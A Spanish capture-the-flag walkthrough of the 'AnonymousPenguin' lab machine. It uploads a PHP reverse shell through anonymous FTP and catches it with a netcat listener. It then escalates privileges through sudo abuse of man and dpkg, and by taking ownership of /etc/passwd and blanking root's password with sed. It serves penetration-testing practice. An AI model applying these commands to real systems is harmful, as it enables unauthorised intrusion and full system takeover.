Maquina: AnonymousPenguin

Autor: El Pinguino de Mario

Dificultad: Facil

![Captura de pantalla 2024-11-17 173629](https://github.com/user-attachments/assets/bb3832f7-8436-4ad9-86a6-dfeae131209d)

ping 172.17.0.2 -c 1

![Captura de pantalla 2024-11-17 174935](https://github.com/user-attachments/assets/1a1cef1d-d84a-4a08-920a-ede040545c47)

nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 172.17.0.2

Vemos que esta abierto el puerto 21 FTP y el puerto 80 HTTP

![Captura de pantalla 2024-11-17 174954](https://github.com/user-attachments/assets/10d3cc6a-f8c6-40f5-b1d7-d772867f388d)

Si accedemos a la pagina web vemos esto

![Captura de pantalla 2024-11-17 175019](https://github.com/user-attachments/assets/bfa86771-bcca-424e-b529-9c17c99f6f9a)

Usamos Gobuster para hacer un reconocimiento web y ver que directorios podemos encontrar

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php

![Captura de pantalla 2024-11-17 175048](https://github.com/user-attachments/assets/75f31781-4e80-4297-9fe8-e4e1bc2473d9)

Vemos que hay un directorio upload pero no hay nada dentro vamos a intentar subir desde el ftp una reverse shell a la carpeta upload y asi conseguir acceso

ftp 172.17.0.2

Accedemos como anonymous sin contraseña

![Captura de pantalla 2024-11-17 175332](https://github.com/user-attachments/assets/fc0e815f-d347-48d2-bd28-a80437e354aa)

dir

![Captura de pantalla 2024-11-17 175342](https://github.com/user-attachments/assets/5fa08e40-b356-4bbf-8c0c-a34959a8e5fb)

En el directorio web también aparace upload

En este directorio vamos a subir un php reverse shell

https://www.revshells.com/

(PHP PentestMonkey, bash, IP y Port)

![Captura de pantalla 2024-11-17 182611](https://github.com/user-attachments/assets/ceaa9204-68e0-4017-8c31-bbdab6fe633a)

copiamos, creamos un file reverseshell.php y pegamos

![Captura de pantalla 2024-11-17 180122](https://github.com/user-attachments/assets/953e467d-5600-4aaa-b9b5-fc19217764b6)

Entramos al directorio upload y subimos el archivo php creado

cd upload

put reverseshell.php

![Captura de pantalla 2024-11-17 180711](https://github.com/user-attachments/assets/810b7915-fbae-49e3-8c77-8a1f9060c0a6)

Nos ponemos en escucha con Netcat

nc -lvnp 443

![Captura de pantalla 2024-11-17 180801](https://github.com/user-attachments/assets/11982bc5-8df1-47fa-a32b-068a189362ab)

http://172.17.0.2/upload/reverseshell.php

![Captura de pantalla 2024-11-17 182247](https://github.com/user-attachments/assets/ea3dd30f-89a3-4591-9e56-8701c09ffdcd)

Tenemos acceso

![Captura de pantalla 2024-11-17 182258](https://github.com/user-attachments/assets/ec0a446a-3dfb-4632-bdb3-48c52fdbfb03)

Tratamiento TTY

script /dev/null -c bash

cntrl + c

![Captura de pantalla 2024-11-17 184322](https://github.com/user-attachments/assets/7b5c4726-964e-4b21-9136-457546bb2335)

stty raw -echo; fg  

reset xterm 

export SHELL=bash

export TERM=xterm

stty size

stty rows 24 columns 80

![Captura de pantalla 2024-11-17 184751](https://github.com/user-attachments/assets/81fba1b2-9690-4b1c-9f39-ed0d71de283e)

Miramos que permisos tiene data

sudo -l 

vemos que podemos ejecutar man como Pingu

![Captura de pantalla 2024-11-17 182826](https://github.com/user-attachments/assets/5ec3b28b-bfb8-490f-a30b-581c317c7f27)

sudo -u pingu /usr/bin/man man

!/bin/sh
whoami

![Captura de pantalla 2024-11-17 185046](https://github.com/user-attachments/assets/89eb8c97-227a-4e19-a17d-547821bb279c)

sudo -l 

vemos que podemos ejecutar nmap y dpkg como el usuario gladys

![Captura de pantalla 2024-11-17 185103](https://github.com/user-attachments/assets/b7eb5949-6174-4dd4-bc04-722732c7c7b6)

sudo -u gladys /usr/bin/dpkg -l

!/bin/sh
whoami

![Captura de pantalla 2024-11-17 185202](https://github.com/user-attachments/assets/bec5f284-c935-4196-b600-72d4ab3b8f96)

sudo -l 
vemos que podemos ejecutar chown como root

![Captura de pantalla 2024-11-17 185224](https://github.com/user-attachments/assets/ded1c9b3-718b-4108-8eaf-556c7e4a2af4)

cambiamos el propietario de /etc/passwd

sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd

Con sed hacemos que elimine la X que tiene root para que la contraseña desaparezca y creamos un archivo temporal en tmp

sed 's/^root:[^:]*:/root::/' /etc/passwd > /tmp/passwd.tmp

copiamos el tmp donde esta el original para que lo sobreescriba

cp /tmp/passwd.tmp /etc/passwd

su root

whoami

![Captura de pantalla 2024-11-17 185337](https://github.com/user-attachments/assets/fb79d802-338e-4cb2-a084-f177e73cc087)


